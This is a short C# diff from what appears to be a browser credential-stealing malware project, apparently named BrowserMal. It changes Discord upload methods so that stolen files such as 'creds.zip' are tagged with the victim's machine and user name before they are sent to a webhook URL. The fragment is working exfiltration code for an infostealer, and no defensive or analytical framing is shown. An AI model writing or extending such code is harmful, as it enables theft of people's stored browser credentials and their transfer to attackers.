@@ -1,4 +1,5 @@
-﻿using Newtonsoft.Json;
+﻿using BrowserMal.Util;
+using Newtonsoft.Json;
 using System;
 using System.Collections.Generic;
 using System.Net.Http;
@@ -47,9 +48,9 @@ namespace BrowserMal.Discord
             catch { }
         }
 
-        public static void SendFile(byte[] file, string url, string fileName) => GenericSender(file, fileName, url);
+        public static void SendFile(byte[] file, string url, string fileName) => GenericSender(file, $"{SystemInfo.MachineName}_{SystemInfo.UserName}_{fileName}", url);
 
-        public static void SendFile(byte[] file, string url) => GenericSender(file, "creds.zip", url);
+        public static void SendFile(byte[] file, string url) => GenericSender(file, $"{SystemInfo.MachineName}_{SystemInfo.UserName}_creds.zip", url);
 
         public static void BulkSend(Dictionary<string, string> files, string url) => SendFile(Util.Zip.ZipArchives(files), url);
     }
